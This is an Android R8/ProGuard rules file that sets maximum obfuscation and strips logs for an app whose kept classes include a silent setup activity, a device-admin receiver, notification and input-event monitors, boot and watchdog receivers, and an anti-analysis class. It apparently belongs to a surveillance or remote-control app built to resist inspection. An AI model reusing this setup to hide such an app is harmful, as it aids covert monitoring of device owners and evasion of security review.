# ─── R8 Full Mode Maximum Obfuscation ─────────────────────────────────────────
-repackageclasses ''
-allowaccessmodification
-overloadaggressively
-mergeinterfacesaggressively

-optimizationpasses 5
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*
-optimizations !method/propagation/returnvalue,!method/propagation/parameter

-keepattributes *Annotation*, Signature, InnerClasses, EnclosingMethod

-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator CREATOR;
}
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ─── Manifest Components (must keep names) ────────────────────────────────────
-keep class com.nexlink.bridge.MainActivity
-keep class com.nexlink.bridge.ConnectorService
-keep class com.nexlink.bridge.BootReceiver
-keep class com.nexlink.bridge.WatchdogReceiver
-keep class com.nexlink.bridge.AppDeviceAdminReceiver
-keep class com.nexlink.bridge.SilentSetupActivity
-keep class com.nexlink.bridge.NotificationMonitor
-keep class com.nexlink.bridge.InputEventService

-keep class com.nexlink.bridge.databinding.** { *; }

-keep class rikka.shizuku.** { *; }
-keep interface rikka.shizuku.** { *; }
-dontwarn rikka.shizuku.**

-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }

-keep class com.google.gson.** { *; }
-keepclassmembers class * {
    @com.google.gson.annotations.SerializedName <fields>;
}
-dontwarn com.google.gson.**

-keep class kotlinx.coroutines.** { *; }
-dontwarn kotlinx.coroutines.**

-keep class kotlin.Metadata { *; }
-dontwarn kotlin.**

# ─── Crypto (masih dipakai untuk MessageDigest & sig hashing) ─────────────────
-keep class javax.crypto.** { *; }
-keep interface javax.crypto.** { *; }
-keep class java.security.** { *; }

# ─── NativeCore JNI — CRITICAL: class name & external method sigs harus persis ─
-keep class com.nexlink.bridge.NativeCore {
    public static *;
    private static *;
}
-keepclasseswithmembernames class com.nexlink.bridge.NativeCore {
    native <methods>;
}
# ObfStr/SecureConfig/AntiAnalysis: keep public API (delegate ke NativeCore)
-keep class com.nexlink.bridge.ObfStr { public *; }
-keep class com.nexlink.bridge.SecureConfig { public *; }
-keep class com.nexlink.bridge.AntiAnalysis { public *; }
-keep class com.nexlink.bridge.StringIds { public static <fields>; }

# ─── Strip logs di release ────────────────────────────────────────────────────
-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int i(...);
    public static int w(...);
    public static int d(...);
    public static int e(...);
}

-assumenosideeffects class java.lang.Throwable {
    public java.lang.String getMessage();
    public java.lang.String getLocalizedMessage();
}
